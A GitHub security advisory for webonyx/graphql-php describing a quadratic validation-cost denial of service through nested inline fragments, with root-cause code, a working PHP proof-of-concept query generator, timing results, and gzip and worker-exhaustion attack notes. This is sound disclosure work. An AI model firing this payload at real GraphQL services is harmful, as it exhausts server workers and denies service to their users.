# [H] webonyx/graphql-php has quadratic validation cost in OverlappingFieldsCanBeMerged via inline fragments

## Summary
Severity: High
Advisory: GHSA-fc86-6rv6-2jpm
CWE: CWE-407
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2026-05-04
Source: https://github.com/advisories/GHSA-fc86-6rv6-2jpm
Type: github-advisory

## Affected
- Packagist: `webonyx/graphql-php` — affected >=0 <15.32.2

## Details
## Summary

`OverlappingFieldsCanBeMerged` validation rule has `O(n^2 x m^2)` worst case via flattened inline fragments. The CVE-2023-26144 named-fragment cache does not cover inline fragments. A 364 KB query (200 outer x 100 inner inline fragments) consumes 117 seconds of CPU per request, with no comparison budget and no validation timeout.

## Affected Component

`src/Validator/Rules/OverlappingFieldsCanBeMerged.php`

## Description

graphql-php is a PHP port of graphql-js and inherits the same `OverlappingFieldsCanBeMerged` algorithm. The rule performs an explicit `O(n^2)` pairwise comparison loop over fields collected for each response name (`collectConflictsWithin`), and recurses into sub-selections via `findConflict`. When the rule receives a query in which several inline fragments select the same response name at multiple nesting levels, the cost compounds to `O(n^2 x m^2)` where `n` and `m` are the number of inline fragments at the outer and inner levels respectively.

graphql-php includes a `comparedFragmentPairs` PairSet cache (the same class of memoization fix tracked under [CVE-2023-26144 / GHSA-9pv7-vfvm-6vr7](https://github.com/advisories/GHSA-9pv7-vfvm-6vr7)), but it is keyed by **named fragment** identity. Inline fragments have no name; they are flattened into the parent `$astAndDefs` map by the `case $selection instanceof InlineFragmentNode` branch starting at `OverlappingFieldsCanBeMerged.php:266`, so they are never observed by the cache. Every pair must be re-compared from scratch on every nesting level.

This finding has been tested against the **latest stable release `webonyx/graphql-php@v15.31.4`** running on PHP 8.3.30.

## Root Cause

### 1. Pairwise `O(n^2)` loop (`collectConflictsWithin`)

```php
// src/Validator/Rules/OverlappingFieldsCanBeMerged.php:306
$fieldsLength = count($fields);

if ($fieldsLength > 1) {
    for ($i = 0; $i < $fieldsLength; ++$i) {                             // line 311
        for ($j = $i + 1; $j < $fieldsLength; ++$j) {                    // line 312
            $conflict = $this->findConflict(
                $context,
                $parentFieldsAreMutuallyExclusive,
                $responseName,
                $fields[$i],
                $fields[$j]
            );
            // ...
        }
    }
}
```

`count($fields)` grows without bound when multiple inline fragments select the same response name in the same parent selection set.

### 2. Inline fragment flattening (`internalCollectFieldsAndFragmentNames`)

```php
// src/Validator/Rules/OverlappingFieldsCanBeMerged.php:266
case $selection instanceof InlineFragmentNode:
    $typeCondition = $selection->typeCondition;
    $inlineFragmentType = $typeCondition === null
        ? $parentType
        : AST::typeFromAST([$context->getSchema(), 'getType'], $typeCondition);

    $this->internalCollectFieldsAndFragmentNames(
        $context,
        $inlineFragmentType,
        $selection->selectionSet,
        $astAndDefs,           // flattened into the parent map
        $fragmentNames
    );
    break;
```

`N` inline fragments selecting the same response name produce `N` entries in `$astAndDefs[$responseName]`, which then trigger `N*(N-1)/2` `findConflict` calls.

### 3. The named-fragment cache does not cover this code path

```php
// src/Validator/Rules/OverlappingFieldsCanBeMerged.php:41
protected PairSet $comparedFragmentPairs;

// :54 (in __construct)
$this->comparedFragmentPairs = new PairSet();
```

`PairSet` is keyed by `(fragmentName1, fragmentName2)`. Inline fragments have no name; they are folded into the parent selection set before the cache is even consulted. The CVE-2023-26144 fix has zero effect on this code path.

### 4. No comparison budget, no validation timeout

There is no counter shared across `collectConflictsWithin`, `collectConflictsBetween`, and the recursive `findConflict` calls. The rule runs to completion regardless of cost. graphql-php exposes no `validate_timeout` equivalent.

## Proof of Concept

```php
<?php
// composer require webonyx/graphql-php:v15.31.4
require __DIR__.'/vendor/autoload.php';

use GraphQL\Language\Parser;
use GraphQL\Validator\DocumentValidator;
use GraphQL\Utils\BuildSchema;

$schema = BuildSchema::build('type Query { field: Node }  type Node { f: Node, g: Node, x: String }');

function gen(int $n, int $m): string {
    $inner = implode(' ', array_fill(0, $m, '... on Node { x }'));
    $outer = implode(' ', array_fill(0, $n, "... on Node { f { $inner } }"));
    return "{ field { $outer } }";
}

echo " N    M  | size      | validate ms | errors\n";
echo "---------|-----------|-------------|--------\n";
foreach ([[20,20],[50,50],[100,50],[100,100],[150,100],[200,100]] as [$n, $m]) {
    $q = gen($n, $m);
    $doc = Parser::parse($q);
    $t0 = microtime(true);
    $errors = DocumentValidator::validate($schema, $doc);
    $elapsed = round((microtime(true) - $t0) * 1000);
    printf("%4d %4d | %7dB | %10d  | %d\n", $n, $m, strlen($q), $elapsed, count($errors));
}
```

### Measured output on `webonyx/graphql-php@v15.31.4`, PHP 8.3.30, Linux x86_64

```
graphql-php version: v15.31.4
PHP version: 8.3.30

 N    M  | size      | validate ms | errors
---------|-----------|-------------|--------
  20   20 |    7653B |         71  | 0
  50   50 |   46113B |       2020  | 0
 100   50 |   92213B |       7762  | 0
 100  100 |  182213B |      29660  | 0
 150  100 |  273313B |      66052  | 0
 200  100 |  364413B |     117082  | 0
```

The growth confirms `O(N^2)` outer scaling: doubling N from 100 to 200 (with M=100 fixed) increases validation time from 29,660 ms to 117,082 ms, a factor of approximately 4. A single 364 KB query consumes **117 seconds** of CPU on one PHP worker with no errors emitted, no timeout, and no remediation.

## Impact

- **Default-on rule**: `OverlappingFieldsCanBeMerged` is part of the rules registered by `DocumentValidator::defaultRules()` and is enabled by default in `DocumentValidator::validate()`. Every Lighthouse, Overblog/GraphQLBundle, wp-graphql, and Drupal GraphQL module application using the standard validation pipeline is exposed.
- **Pre-execution**: the cost is in the validation phase. `QueryComplexity` and `QueryDepth` rules cannot help: the example query has depth 3 and complexity 1.
- **PHP `max_execution_time` hits the wall too late**: a default Lighthouse/Laravel deployment ships with `max_execution_time = 30` seconds. A single 100x100 request takes 29.6 seconds in graphql-php, just inside the limit. A 150x100 request takes 66 seconds and will be killed by `max_execution_time`, but the worker has already burned 30 seconds of CPU per request before being killed; an attacker can sustain that load with low-RPS traffic.
- **Body-size and WAF bypass via gzip**: the payload is the same string repeated N times. A 364 KB raw payload compresses to a few kilobytes via gzip. Any graphql-php deployment behind nginx, Apache, or a CDN with default body-size handling will accept the compressed request and decompress it before reaching the validator.
- **php-fpm worker pool exhaustion**: each request consumes one full PHP worker process. A typical php-fpm pool has 5-50 workers; an attacker firing a handful of parallel requests pins the entire pool for the duration of the validation.
- **Existing CVE-2023-26144 fix is insufficient**: the published `PairSet` cache only memoizes named-fragment comparisons, not the inline-fragment flattening path.

This is the same vulnerability class as **CVE-2023-26144** (partially fixed by named-fragment memoization only) and **CVE-2023-28867** (fully fixed via the Adameit algorithm). Both fixes pre-date this finding.

## Affected Versions

- **`webonyx/graphql-php@v15.31.4`** (latest stable as of 2026-04-08): all measurements above were collected on this version with no custom configuration.
- All versions of `webonyx/graphql-php` that ship `OverlappingFieldsCanBeMerged` (effectively all 15.x and 14.x stable releases). They share the same code path and are believed vulnerable but were not retested individually.

## Remediation

Three options ordered from best to minimal:

### Option 1 -- Adopt the Adameit algorithm

Replace pairwise comparison with the uniqueness-check algorithm designed by Simon Adameit, used today by graphql-java (post CVE-2023-28867) and Sangria. The algorithm transforms conflict-freedom into a uniqueness requirement and runs in `O(n log n)` instead of `O(n^2)`. See [graphql/graphql-js issue #2185](https://github.com/graphql/graphql-js/issues/2185) for the design discussion and the [Sangria PR #12](https://github.com/sangria-graphql-org/sangria/pull/12) for the original implementation.

### Option 2 -- Comparison budget

Add a comparison counter on `OverlappingFieldsCanBeMerged` shared across `collectConflictsWithin`, `collectConflictsBetween`, and the recursive `findConflict` calls. Throw a `Error` after a configurable threshold (for example 10,000 comparisons by default). This is the approach graphql-java implemented after CVE-2023-28867.

### Option 3 -- Cap inline-fragment flattening

In `internalCollectFieldsAndFragmentNames`, cap `count($astAndDefs[$responseName])` at a configurable limit (for example 1,000) and emit a validation error if exceeded. This is a narrower fix that targets the specific bypass path but does not address other potential `O(n^2)` surfaces.

## Resources

- [CVE-2023-26144 -- graphql-js (partial fix, named-fragment cache only)](https://github.com/advisories/GHSA-9pv7-vfvm-6vr7)
- [CVE-2023-28867 -- graphql-java (full fix via Adameit algorithm)](https://github.com/advisories/GHSA-p4qx-6w5p-4rj2)
- [graphql-js Issue #2185 -- Faster algorithm for OverlappingFieldsCanBeMerged](https://github.com/graphql/graphql-js/issues/2185)
- [Sangria PR #12 -- original optimised implementation](https://github.com/sangria-graphql-org/sangria/pull/12)
- [GraphQL spec section 5.3.2 -- Field Selection Merging](https://spec.graphql.org/October2021/#sec-Field-Selection-Merging)
- Companion advisory for this implementation: `GraphQL\Language\Parser` parser stack overflow via deeply nested queries (Unbounded recursion in parser causes stack overflow on crafted nested input).

## References
- https://github.com/webonyx/graphql-php/security/advisories/GHSA-fc86-6rv6-2jpm
- https://github.com/graphql/graphql-js/issues/2185
- https://github.com/sangria-graphql-org/sangria/pull/12
- https://github.com/webonyx/graphql-php/commit/996adcfce33442f6fc01214777bc8620cc142d85
- https://github.com/advisories/GHSA-9pv7-vfvm-6vr7
- https://github.com/advisories/GHSA-p4qx-6w5p-4rj2
- https://github.com/webonyx/graphql-php
- https://github.com/webonyx/graphql-php/releases/tag/v15.32.2
- https://spec.graphql.org/October2021/#sec-Field-Selection-Merging
